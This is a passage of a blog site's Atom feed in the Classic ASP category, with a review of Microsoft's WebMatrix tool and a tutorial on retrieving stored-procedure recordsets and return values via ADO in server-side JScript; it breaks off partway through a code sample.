<?xml version="1.0" encoding="UTF-8"?><feed
  xmlns="http://www.w3.org/2005/Atom"
  xmlns:thr="http://purl.org/syndication/thread/1.0"
  xml:lang="en-US"
  xml:base="/wp-atom.php"
   >
	<title type="text">Classic ASP &#8211; LessthanDot</title>
	<subtitle type="text">A Technical Community for IT Professionals</subtitle>

	<updated>2019-03-09T12:50:36Z</updated>

	<link rel="alternate" type="text/html" href="/" />
	<id>/index.php/feed/atom/</id>
	<link rel="self" type="application/atom+xml" href="/index.php/category/webdev/serverprogramming/classicasp/feed/atom/" />

	<generator uri="https://wordpress.org/" version="4.6.1">WordPress</generator>
	<entry>
		<author>
			<name>Eli Weinstock-Herman (tarwn)</name>
					</author>
		<title type="html"><![CDATA[The Many Functions of WebMatrix]]></title>
		<link rel="alternate" type="text/html" href="/index.php/webdev/serverprogramming/the-many-functions-of-webmatrix/" />
		<id>/index.php/2011/06/the-many-functions-of-webmatrix/</id>
		<updated>2011-06-23T11:42:00Z</updated>
		<published>2011-06-23T11:42:00Z</published>
		<category scheme="/" term="ASP.NET" /><category scheme="/" term="Classic ASP" /><category scheme="/" term="Server Programming" /><category scheme="/" term="asp.net" /><category scheme="/" term="razor" /><category scheme="/" term="webmatrix" />		<summary type="html"><![CDATA[Several weeks ago I started digging into WebMatrix. Over the course of a weekend I was able to put together a quick, functioning website, pick up some basics of working with WebMatrix and the deployment tool, and play with a few other technologies as well. Then I stepped back and realized I was only using a percentage of it's capabilities.]]></summary>
		<content type="html" xml:base="/index.php/webdev/serverprogramming/the-many-functions-of-webmatrix/"><![CDATA[<p>Several weeks ago I started digging into WebMatrix. Over the course of a weekend I was able to put together a quick, functioning website, pick up some basics of working with WebMatrix and the deployment tool, and play with a few other technologies as well. Then I stepped back and realized I was only using a percentage of it&#8217;s capabilities.</p>
<p>I&#8217;ve read a lot of blogs and articles on Web Matrix and none of them prepared me for the sheer range of capabilities this little tool offers. One would mention writing a web page, another would talk about deployment, a third about WordPress&#8230;it wasn&#8217;t until I started playing with it and went to write a blog entry of my own that I realized how much capability was packed into this one &#8216;little&#8217; tool. </p>
<p>This isn&#8217;t a deep dive, there&#8217;s plenty of those. This is a shallow float across the surface of what is actually a quite impressive (and don&#8217;t forget free) tool.</p>
<h2>What is WebMatrix?</h2>
<p>WebMatrix is a free web development tool from Microsoft that helps you create and publish websites.</p>
<p>So is it a tool? A set of templates? A language? A publication engine?</p>
<p>Yes.</p>
<p>And an IIS express manager, database configurator, generator of CMS-driven sites &#8230;The kitchen sink is in there somewhere.</p>
<h2>Building Sites</h2>
<p>WebMatrix works around the concept of a Site. A site can start as an entry in the gallery of pre-built packages or as a template and/or blank code files. </p>
<div style="border: 1px solid #AAAAAA; font-size: 80%; color: #666666; text-align: center; padding: 8px; margin: 8px;">
<img src="http://tiernok.com/LTDBlog/webmatrix/WebGallery.png" alt="Web Gallery" style="padding-bottom: 5px;" /><br />
Web Gallery in Web Matrix
</div>
<p>The Gallery option presents a list of 52 CMS, blogging, eCommerce, (the list goes on) packages that can be installed simply by selectig them. If I select the WordPress option, WebMatrix detects that I don&#8217;t have MyQSL installed and asks if I want to install it or have access to a remote installation. Other gallery options offer similar interactions for their own requirements, with the goal being a completely running system in only a few clicks. In the case of WordPress it will also detect whether you have PHP installed (more on that later) and install that as well.</p>
<div style="border: 1px solid #AAAAAA; font-size: 80%; color: #666666; text-align: center; padding: 8px; margin: 8px;">
<img src="http://tiernok.com/LTDBlog/webmatrix/Installing.png" alt="WordPress Install" style="padding-bottom: 5px;" /><br />
Installing WordPress
</div>
<p>With a download, a few button clicks, administrative permissions, and entry of some basic settings, I just installed a fully customizeable version of WordPress. Which is really cool, but also kind of scary if you think about how little technical knowledge I really needed and that there are dozens of other packages available.</p>
<p><em>Note: it was at this point I noticed my MySQL installation was annoyed and not running properly, leaving me stuck partway on the WordPress Install. So a big YMMV may be necessary here, as it seems my skill at causing things to break has managed to break yet another &#8220;Next, Next, Next&#8221; wizardy dialog.</em></p>
<p><strong>More Depth:</strong> <a href="http://drewby.com/a-wordpress-blog-in-15-minutes-with-webmatrix" title="A WordPress Blog in 15 Minutes with WebMatrix">A WordPress Blog in 15 Minutes with WebMatrix</a></p>
<h2>Building Sites &#8211; But Wait, There&#8217;s More</h2>
<p>Ok, so what if we want to build our own site?</p>
<div style="border: 1px solid #AAAAAA; font-size: 80%; color: #666666; text-align: center; padding: 8px; margin: 8px;">
<img src="http://tiernok.com/LTDBlog/webmatrix/SiteFromTemplate.png" alt="Creating Site From Template" style="padding-bottom: 5px;" /><br />
Creating Site from Template
</div>
<p>The other side of the Site creation process is the option to create one from a template. This offers five options ranging from &#8220;Empty Site&#8221; to &#8220;Start Site and even &#8220;Bakery&#8221;. If you start with one of the non-Empty sites you will be given all the files and folders for a fully functioning site. These sites are based on the new WebPages framework and written in the C#-style razor syntax. The WebPages framework was released in conjunction with WebMatrix and joins Web Forms and MVC as an available ASP.Net framework.</p>
<p>If we select the empty site option we&#8217;ll be presented with one lonely little robots.txt file and an empty folder. The interesting part is what happens when we ask to add a file. We receive a file creation dialog (which should be familiar to Visual Studio users) and, given what I have seen so far and my Visual Studio background, I expect a list of CSHTML files, CSS, and maybe a JS or HTML. </p>
<p>Nope.</p>
<p>HTML, CSS, JScript, and CSHTML are present, but so are (huge breath): VBHTML, 2 ASPX&#8217;s (VB + C#), Classic ASP, PHP, TXT, XML, 2 Class Files (VB + C#), 3 Global ASA[X]&#8217;s, 3 Master Pages, SQL, User Controls (VB + C#), and 4 web configs (.Net 2, 3, 3.5, 4).</p>
<p>The CSHTML and VBHTML options are using the new <a href="http://weblogs.asp.net/scottgu/archive/2010/07/02/introducing-razor.aspx" title="Razor engine announcement">razor engine</a> and this is the most commonly documented option both on the <a href="http://www.asp.net/web-pages" title="Resources at ASP.Net">ASP.Net website</a> and in blogs. The PHP option offers you a choice between installation of PHP 5.2 and 5.3 (enable it in IIS by checking the lonely PHP checkbox in the IIS/site settings) and away we go with some PHP-ing. </p>
<p>And to be honest I haven&#8217;t even had time to try the rest, but they all seem fairly self-explanatory and, if I could get PHP running in a new MS web tool in just a few moments, I don&#8217;t expect to see too many surprises from the cast of MS Web technologies. Although I do want to try the Classic ASP one, for nostalgia if nothing else.</p>
<p><strong>More Depth:</strong> <a href="http://www.asp.net/webmatrix/tutorials" title="WebMatrix Tutorials at ASP.net">Web Matrix Tutorials (CSHTML) at ASP.Net</a><br />
<strong>More Depth:</strong> <a href="http://blogs.msdn.com/b/brian_swan/archive/2010/07/12/creating-php-websites-with-webmatrix.aspx" title="Creating PHP Websites with WebMatrix">Creating PHP Websites with WebMatrix</a><br />
<strong>More Depth:</strong> <a href="/index.php/WebDev/UIDevelopment/AJAX/trying-out-webmatrix-and-razor" title="Chrissie - Trying Out WebMatrix and Razor">Trying Out WebMatrix and Razor</a> by Chrissie<br />
<strong>More Depth:</strong> Not finding a good Classic ASP link&#8230;</p>
<p>Unfortunately intellisense is either non-existent or just extremely limited and not noticeable after a day using Visual Studio. However, if you have Visual Studio available then you can click the Visual Studio button on the WebMatrix tool bar and the project and file you are currently working on will immediately open in Visual Studio, allowing you to take advantage of it&#8217;s more extensive editing (and of course intellisense) capabilities.</p>
<h2>Running and Debugging Sites</h2>
<p>With so many different options, running these sites must require jumping through a hoop, on fire, balancing a water balloon on our nose, right?</p>
<p>Not so much.</p>
<p>WebMatrix uses IIS Express internally and offers a simple interface to hook into just a few settings that will cover most of our needs. Press the &#8220;Run&#8221; button and we&#8217;re greeted with the current page run in whatever our default browser is. </p>
<div style="border: 1px solid #AAAAAA; font-size: 80%; color: #666666; text-align: center; padding: 8px; margin: 8px;">
<img src="http://tiernok.com/LTDBlog/webmatrix/Toolbar.png" alt="WebMatrix Files Toolbar" style="padding-bottom: 5px; max-width: 750px;" /><br />
WebMatrix Files Toolbar
</div>
<p>PHP? CSHTML? Text file? Doesn&#8217;t matter. Because IIS Express is running in the background, all WebMatrix has to do is fire a URL at a browser and we&#8217;re there. </p>
<p>Another advantage to this setup is that we don&#8217;t have to dig through yet another revision of the IIS management interface. Which is great for me, as I have been downgraded to just a programmer for the last few years and left most of my IIS management experience rusting away on the older IIS 6/5/4-style interface.</p>
<div style="border: 1px solid #AAAAAA; font-size: 80%; color: #666666; text-align: center; padding: 8px; margin: 8px;">
<img src="http://tiernok.com/LTDBlog/webmatrix/requests.png" alt="WebMatrix Requests Page" style="padding-bottom: 5px;" /><br />
IIS Requests Page
</div>
<p>Basic settings are available to manage our default site pages, enable PHP, change the .Net framework version, enable SSL, and so on. A page is also available to view the HTTP requests that are being made to the IIS instance, letting us see the lonely calls for a favicon go forever unanswered or the execution time for each individual HTTP request.</p>
<h2>Managing Data</h2>
<p>So we have web pages and a way to host them, what about managing the database behind the site? Yep, WebMatrix is there too.</p>
<p>The Databases tab will show you any connections we have configured for the site, as well as any SQL Compact databases (SDF files) available to the site. In our WordPress example this means we have a configured connection to a MySQL (5?) database. For my first sample site I have a SQL Compact database with the ability to manage the tables from inside Web Matrix. I haven&#8217;t connected to SQL Server from inside yet, so I can&#8217;t say whether it offers just a view of the connection, like MySQL, or more extensive management of the tables and queries like SQL Compact or an MDF in Visual Studio.</p>
<div style="border: 1px solid #AAAAAA; font-size: 80%; color: #666666; text-align: center; padding: 8px; margin: 8px;">
<img src="http://tiernok.com/LTDBlog/webmatrix/database.png" alt="SQL Compact View" style="padding-bottom: 5px;" /><br />
SQL Compact DB
</div>
<p>Later on when we deploy we get an interesting option for SDF files. They are treated separately from the main files and are not automatically selected as part of the sync (limiting the chances of a low-coffee-foot-shooting incident).</p>
<p><strong>More Depth:</strong> <a href=http://www.microsoft.com/web/post/connecting-to-a-sql-server-or-mysql-database-in-webmatrix"" title="Connecting to a SQL Server or MySQL Database in WebMatrix">Database Connections at Microsot.com</a><br />
<strong>More Depth:</strong> <a href="http://erikej.blogspot.com/" title="Everything SQL Server Compact">Everything SQL Server Compact site</a><br />
<strong>More Depth:</strong> <a href="https://xosfaere.wordpress.com/2011/01/30/entity-framework-code-first-development-with-sql-ce-4-0/" title="Code-First Development (EF) w/ SQL CE 4.0">Code-First Development (EF) w/ SQL CE 4.0</a> &#8211; I wonder, if you do it DB-first is the code actually larger than the DB?</p>
<h2>Site Reports</h2>
<p>To be honest I haven&#8217;t spent more than about 15 minutes in the site reports because there is just so much to Web Matrix.</p>
<p>I had difficulty creating reports for some sites because it seemed like the report engine would immediately run out and start trying to index the internet. Once I got that under control I was able to run a report of my site and get back some meaningful (and some not) information.</p>
<div style="border: 1px solid #AAAAAA; font-size: 80%; color: #666666; text-align: center; padding: 8px; margin: 8px;">
<img src="http://tiernok.com/LTDBlog/webmatrix/reports.png" alt="Reports" style="padding-bottom: 5px;" /><br />
WebMatrix Reports
</div>
<p>Basically the reporting mechanism attempts to walk through the entire site, gathering statistics on the amount of time each page took to run as well as SEO warnings and errors on each page. The output of the the SEO and Performance data comes with a slider that lets you dynamically filter the output from all information to just the most important subset.</p>
<div style="border: 1px solid #AAAAAA; font-size: 80%; color: #666666; text-align: center; padding: 8px; margin: 8px;">
<img src="http://tiernok.com/LTDBlog/webmatrix/slider.png" alt="Silder" style="padding-bottom: 5px;" /><br />
Report Slider
</div>
<p>For the SEO errors, selecting an individual error displays more information about the error. Probably the most consistent warning I received was leaving the the meta description tag off every page I had written (guilty as charged). Examples of other errors included broken hyperlinks, mixed canonical formats, and just plain bad URLs. </p>
<p><strong>More Depth:</strong> <a href="http://www.microsoft.com/web/post/webmatrix-reports-workspace-help" title="Reports Workspace Help">Webmatrix Reports Workspace Help</a><br />
<strong>More Depth:</strong> <a href="http://www.microsoft.com/web/post/use-webmatrix-to-optimize-your-site-for-search-engines" title="Use WebMatrix to optimize your site for search engines">Use WebMatrix to optimize your site for search engines</a></p>
<h2>Deploying a Site</h2>
<p>Web Matrix uses <a href="http://blogs.iis.net/msdeploy/" title="Official WebDeploy team blog">WebDeploy</a>, doing away with all the manual file dragging or xcopying. On the initial deployment we are asked to enter settings in for our host or, if we don&#8217;t have a host, the tool points us to a <a href="http://www.microsoft.com/web/Hosting/Home?" title="Find Web hosting at microsoft.com">host shopping page</a> to help us find one. Once we have a host, we return to the typical WebMatrix approach of only needing a few settings (instead of a reference manual the size of my car).</p>
<div style="border: 1px solid #AAAAAA; font-size: 80%; color: #666666; text-align: center; padding: 8px; margin: 8px;">
<img src="http://tiernok.com/LTDBlog/webmatrix/publish1.png" alt="Publishing" style="padding-bottom: 5px;" /><br />
WebMatrix Publishing
</div>
<p>The initial deployment only takes a few settings or, if you are like me and have a host that supports it, the download of a settings file. The only major hiccup I ran into was that at one point I had a SQL Compact database open in Visual Studio (or maybe just locked, not sure) and this caused all kinds of deployment problems. I have since decided that closing visual studio while deploying seems to be the safe, pain-free route.</p>
<p>Deployments after the initial one are not full site deployments. The tool will scan for changes that haven&#8217;t been deployed yet and provide us with the option of selecting which changes we would like to deploy. It automatically selects all file changes, but leaves SQL Compact files unchecked. </p>
<div style="border: 1px solid #AAAAAA; font-size: 80%; color: #666666; text-align: center; padding: 8px; margin: 8px;">
<img src="http://tiernok.com/LTDBlog/webmatrix/publish2.png" alt="Publishing" style="padding-bottom: 5px;" /><br />
WebMatrix Publishing
</div>
<p>One problem I have run into, coming from a larger scale database background, was that sometimes I would forget to download a fresh copy of the database before making schema changes (so I then had to download the database, make the changes again, then deploy it back to the live site).</p>
<p><strong>More Depth:</strong> <a href="http://learn.iis.net/page.aspx/871/publish-your-website/" title="Publish Your Website - IIS.Net">Publish Your Website &#8211; IIS.Net</a><br />
<strong>More Depth:</strong> <a href="http://www.hanselman.com/blog/MicrosoftWebMatrixInContextAndDeployingYourFirstSite.aspx" title="Microsoft WebMatrix in Context and Deploying Your First Site">Microsoft WebMatrix in Context and Deploying Your First Site &#8211; Scot Hanselman</a></p>
<h2>The Bad News</h2>
<p>Not all is perfect in WebMatrix land. There are a lot of developers that will dismiss it (and anyone using it) out of hand because they see it as a step backwards (it&#8217;s ok, though, you probably don&#8217;t want to see the code they&#8217;ve been writing anyway). </p>
<p>Perhaps the biggest problem I ran into while using it was the fact that the interface occasionally went wonky on my quad-core, 10GB of RAM system w/ a fairly expensive graphics card. Apparently this is due to the use of WPF, and I&#8217;m not the first LessThanDot-er that has had <a href="/index.php/DesktopDev/MSTech/a-few-reasons-why-i-m-not-yet-moving-to" title="Chrissie's post on A Few Reasons I'm Not Yet Moving to WPF">issues with WPF</a> (and yes, my graphics drivers are up to date).</p>
<p>There are times (like with the WordPress install above) when things won&#8217;t go 100% smoothly. I have only been using it for a few weeks and so far the level of issues has not been enough to warrant a rant on twitter or switching to another topic of study, but stay tuned, it&#8217;s still a young technology.</p>
<h2>Go Try It</h2>
<p>There is little reason not to try this tool. The <a href="http://www.microsoft.com/web/webmatrix/" title="WebMatrix page at Microsoft">download</a> is free, you don&#8217;t have to invest a lot of time to learn how to use a few options in it, and you might just find that it&#8217;s a useful tool to have in your toolbelt. If you are one of the crowd that&#8217;s convinced you don&#8217;t need to learn anything past the one technology you know (and use WITH NO LOCK everywhere) then this may be too complex for you, but the rest should at least give it a try, even the non-developers. Being able to spend an afternoon putting together even a fake little website can be a fun accomplishment and, for me at least, reminded me why I got into web development and programming in the first place.</p>
]]></content>
			<link rel="replies" type="text/html" href="/index.php/webdev/serverprogramming/the-many-functions-of-webmatrix/#comments" thr:count="0"/>
		<link rel="replies" type="application/atom+xml" href="/index.php/webdev/serverprogramming/the-many-functions-of-webmatrix/feed/atom/" thr:count="0"/>
		<thr:total>0</thr:total>
		</entry>
		<entry>
		<author>
			<name>kaht</name>
					</author>
		<title type="html"><![CDATA[Using ASP to retrieve a recordset and return value from a stored procedure at the same time]]></title>
		<link rel="alternate" type="text/html" href="/index.php/webdev/serverprogramming/classicasp/using-asp-to-retrieve-a-recordset-and-re/" />
		<id>/index.php/2009/08/using-asp-to-retrieve-a-recordset-and-re/</id>
		<updated>2009-08-10T18:43:33Z</updated>
		<published>2009-08-10T18:43:33Z</published>
		<category scheme="/" term="Classic ASP" />		<summary type="html"><![CDATA[(This post will use ASP, coded with server side JScript)

When accessing an SQL stored procedure in ASP via ADO, it is typically considered best practice to use the command object:


var oConn = Server.CreateObject("ADODB.Connection");
oConn.Open(&#8230;]]></summary>
		<content type="html" xml:base="/index.php/webdev/serverprogramming/classicasp/using-asp-to-retrieve-a-recordset-and-re/"><![CDATA[<p><em>(This post will use ASP, coded with server side JScript)</em></p>
<p>When accessing an SQL stored procedure in ASP via ADO, it is typically considered best practice to use the command object:</p>

<div class="bwp-syntax-block clearfix">
<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="asp"><thead><tr><td colspan="2"  class="head">ASP</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
2
3
4
5
6
7
8
9
</pre></td><td class="de1"><pre class="de1"><span class="kw2">var</span> oConn <span class="sy0">=</span> <span class="kw1">Server</span>.<span class="kw3">CreateObject</span><span class="br0">&#40;</span><span class="st0">&quot;ADODB.Connection&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
oConn.<span class="kw3">Open</span><span class="br0">&#40;</span><span class="st0">&quot;Provider=SQLOLEDB; Data Source=ServerName; User Id=ID; Password=PASSWORD&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw2">var</span> oCmd <span class="sy0">=</span> <span class="kw1">Server</span>.<span class="kw3">CreateObject</span><span class="br0">&#40;</span><span class="st0">&quot;ADODB.Command&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
oCmd.<span class="me1">ActiveConnection</span> <span class="sy0">=</span> oConn<span class="sy0">;</span>
oCmd.<span class="me1">CommandType</span> <span class="sy0">=</span> adCmdStoredProc<span class="sy0">;</span>
oCmd.<span class="me1">CommandText</span> <span class="sy0">=</span> <span class="st0">&quot;StoredProcedureName&quot;</span><span class="sy0">;</span>
oCmd.<span class="kw3">Execute</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
oCmd.<span class="kw3">Close</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
oConn.<span class="kw3">Close</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span></pre></td></tr></tbody></table></div>
<div class="bwp-syntax-source"><pre class="no-parse">var oConn = Server.CreateObject("ADODB.Connection");
oConn.Open("Provider=SQLOLEDB; Data Source=ServerName; User Id=ID; Password=PASSWORD");
var oCmd = Server.CreateObject("ADODB.Command");
oCmd.ActiveConnection = oConn;
oCmd.CommandType = adCmdStoredProc;
oCmd.CommandText = "StoredProcedureName";
oCmd.Execute();
oCmd.Close();
oConn.Close();</pre></div></div>

<p>If the stored procedure returns a recordset, then the Execute() method of the command object will return a recordset object.</p>
<p>Consder the following stored procedure:</p>

<div class="bwp-syntax-block clearfix">
<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="tsql"><thead><tr><td colspan="2"  class="head">T-SQL</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
2
3
4
</pre></td><td class="de1"><pre class="de1"><span class="kw1">create</span> <span class="kw1">procedure</span> TestProcedure <span class="kw1">as</span>
<span class="kw1">select</span> <span class="nu0">1</span> <span class="br0">&#91;</span>testValue<span class="br0">&#93;</span> <span class="kw1">union</span>
<span class="kw1">select</span> <span class="nu0">2</span> <span class="br0">&#91;</span>testValue<span class="br0">&#93;</span> <span class="kw1">union</span>
<span class="kw1">select</span> <span class="nu0">3</span> <span class="br0">&#91;</span>testValue<span class="br0">&#93;</span> </pre></td></tr></tbody></table></div>
<div class="bwp-syntax-source"><pre class="no-parse">create procedure TestProcedure as
select 1 [testValue] union
select 2 [testValue] union
select 3 [testValue] </pre></div></div>

<p>Using a command object set up to call this procedure, we can access the returned recordset like so:</p>

<div class="bwp-syntax-block clearfix">
<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="asp"><thead><tr><td colspan="2"  class="head">ASP</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="de1"><pre class="de1"><span class="kw2">var</span> oConn <span class="sy0">=</span> <span class="kw1">Server</span>.<span class="kw3">CreateObject</span><span class="br0">&#40;</span><span class="st0">&quot;ADODB.Connection&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
oConn.<span class="kw3">Open</span><span class="br0">&#40;</span><span class="st0">&quot;Provider=SQLOLEDB; Data Source=ServerName; User Id=ID; Password=PASSWORD&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw2">var</span> oCmd <span class="sy0">=</span> <span class="kw1">Server</span>.<span class="kw3">CreateObject</span><span class="br0">&#40;</span><span class="st0">&quot;ADODB.Command&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
oCmd.<span class="me1">ActiveConnection</span> <span class="sy0">=</span> oConn<span class="sy0">;</span>
oCmd.<span class="me1">CommandType</span> <span class="sy0">=</span> adCmdStoredProc<span class="sy0">;</span>
oCmd.<span class="me1">CommandText</span> <span class="sy0">=</span> <span class="st0">&quot;TestProcedure&quot;</span><span class="sy0">;</span>
<span class="kw2">var</span> oRS <span class="sy0">=</span> oCmd.<span class="kw3">Execute</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span> &nbsp;<span class="co2">//oRS will contain the recordset returned from the stored procedure</span>
<span class="kw1">while</span> <span class="br0">&#40;</span><span class="sy0">!</span>oRS.<span class="kw2">EOF</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
&nbsp; &nbsp;<span class="kw1">Response</span>.<span class="kw3">Write</span><span class="br0">&#40;</span>oRS.<span class="kw3">Fields</span><span class="br0">&#40;</span><span class="st0">&quot;testValue&quot;</span><span class="br0">&#41;</span>.<span class="me1">value</span> + <span class="st0">&quot;&lt;br /&gt;&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
&nbsp; &nbsp;oRS.<span class="kw3">MoveNext</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="br0">&#125;</span>
oRS.<span class="kw3">Close</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
oCmd.<span class="kw3">Close</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
oConn.<span class="kw3">Close</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span></pre></td></tr></tbody></table></div>
<div class="bwp-syntax-source"><pre class="no-parse">var oConn = Server.CreateObject("ADODB.Connection");
oConn.Open("Provider=SQLOLEDB; Data Source=ServerName; User Id=ID; Password=PASSWORD");
var oCmd = Server.CreateObject("ADODB.Command");
oCmd.ActiveConnection = oConn;
oCmd.CommandType = adCmdStoredProc;
oCmd.CommandText = "TestProcedure";
var oRS = oCmd.Execute();  //oRS will contain the recordset returned from the stored procedure
while (!oRS.EOF) {
   Response.Write(oRS.Fields("testValue").value + "&lt;br /&gt;");
   oRS.MoveNext();
}
oRS.Close();
oCmd.Close();
oConn.Close();</pre></div></div>

<p>If a stored procedure returns a return value, then a return value parameter is required on the ADO command object.</p>
<p>Consider the following procedure:</p>

<div class="bwp-syntax-block clearfix">
<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="tsql"><thead><tr><td colspan="2"  class="head">T-SQL</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
2
</pre></td><td class="de1"><pre class="de1"><span class="kw1">create</span> <span class="kw1">procedure</span> TestProcedure2 <span class="kw1">as</span>
<span class="kw1">return</span> <span class="nu0">1</span></pre></td></tr></tbody></table></div>
<div class="bwp-syntax-source"><pre class="no-parse">create procedure TestProcedure2 as
return 1</pre></div></div>

<p>To retrieve the return value in the stored procedure, you have to set up a parameter on the command object to store the return value:</p>

<div class="bwp-syntax-block clearfix">
<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="asp"><thead><tr><td colspan="2"  class="head">ASP</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="de1"><pre class="de1"><span class="kw2">var</span> oConn <span class="sy0">=</span> <span class="kw1">Server</span>.<span class="kw3">CreateObject</span><span class="br0">&#40;</span><span class="st0">&quot;ADODB.Connection&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
oConn.<span class="kw3">Open</span><span class="br0">&#40;</span><span class="st0">&quot;Provider=SQLOLEDB; Data Source=ServerName; User Id=ID; Password=PASSWORD&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw2">var</span> oCmd <span class="sy0">=</span> <span class="kw1">Server</span>.<span class="kw3">CreateObject</span><span class="br0">&#40;</span><span class="st0">&quot;ADODB.Command&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
oCmd.<span class="me1">ActiveConnection</span> <span class="sy0">=</span> oConn<span class="sy0">;</span>
oCmd.<span class="me1">CommandType</span> <span class="sy0">=</span> adCmdStoredProc<span class="sy0">;</span>
oCmd.<span class="me1">CommandText</span> <span class="sy0">=</span> <span class="st0">&quot;TestProcedure2&quot;</span><span class="sy0">;</span>
oCmd.<span class="me1">Parameters</span>.<span class="me1">Append</span><span class="br0">&#40;</span>oCmd.<span class="me1">CreateParameter</span><span class="br0">&#40;</span><span class="st0">&quot;@returnValue&quot;</span>, adInteger, adParamReturnValue<span class="br0">&#41;</span><span class="br0">&#41;</span><span class="sy0">;</span>
oCmd.<span class="kw3">Execute</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw1">Response</span>.<span class="kw3">Write</span><span class="br0">&#40;</span><span class="st0">&quot;return value: &quot;</span> + oCmd.<span class="me1">Parameters</span><span class="br0">&#40;</span><span class="st0">&quot;@returnValue&quot;</span><span class="br0">&#41;</span>.<span class="me1">value</span><span class="br0">&#41;</span><span class="sy0">;</span>
oCmd.<span class="kw3">Close</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
oConn.<span class="kw3">Close</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span></pre></td></tr></tbody></table></div>
<div class="bwp-syntax-source"><pre class="no-parse">var oConn = Server.CreateObject("ADODB.Connection");
oConn.Open("Provider=SQLOLEDB; Data Source=ServerName; User Id=ID; Password=PASSWORD");
var oCmd = Server.CreateObject("ADODB.Command");
oCmd.ActiveConnection = oConn;
oCmd.CommandType = adCmdStoredProc;
oCmd.CommandText = "TestProcedure2";
oCmd.Parameters.Append(oCmd.CreateParameter("@returnValue", adInteger, adParamReturnValue));
oCmd.Execute();
Response.Write("return value: " + oCmd.Parameters("@returnValue").value);
oCmd.Close();
oConn.Close();</pre></div></div>

<p>Now, things get a little tricky if you have a recordset and a return value in the same procedure:</p>

<div class="bwp-syntax-block clearfix">
<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="tsql"><thead><tr><td colspan="2"  class="head">T-SQL</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
2
3
4
5
</pre></td><td class="de1"><pre class="de1"><span class="kw1">create</span> <span class="kw1">procedure</span> TestProcedure3 <span class="kw1">as</span>
<span class="kw1">select</span> <span class="nu0">1</span> <span class="br0">&#91;</span>testValue<span class="br0">&#93;</span> <span class="kw1">union</span>
<span class="kw1">select</span> <span class="nu0">2</span> <span class="br0">&#91;</span>testValue<span class="br0">&#93;</span> <span class="kw1">union</span>
<span class="kw1">select</span> <span class="nu0">3</span> <span class="br0">&#91;</span>testValue<span class="br0">&#93;</span> 
<span class="kw1">return</span> <span class="nu0">1</span></pre></td></tr></tbody></table></div>
<div class="bwp-syntax-source"><pre class="no-parse">create procedure TestProcedure3 as
select 1 [testValue] union
select 2 [testValue] union
select 3 [testValue] 
return 1</pre></div></div>

<p>The recordset object will be populated correctly, but the return value parameter returns &#8220;undefined&#8221;:</p>

<div class="bwp-syntax-block clearfix">
<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="asp"><thead><tr><td colspan="2"  class="head">ASP</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="de1"><pre class="de1"><span class="kw2">var</span> oConn <span class="sy0">=</span> <span class="kw1">Server</span>.<span class="kw3">CreateObject</span><span class="br0">&#40;</span><span class="st0">&quot;ADODB.Connection&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
oConn.<span class="kw3">Open</span><span class="br0">&#40;</span><span class="st0">&quot;Provider=SQLOLEDB; Data Source=ServerName; User Id=ID; Password=PASSWORD&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
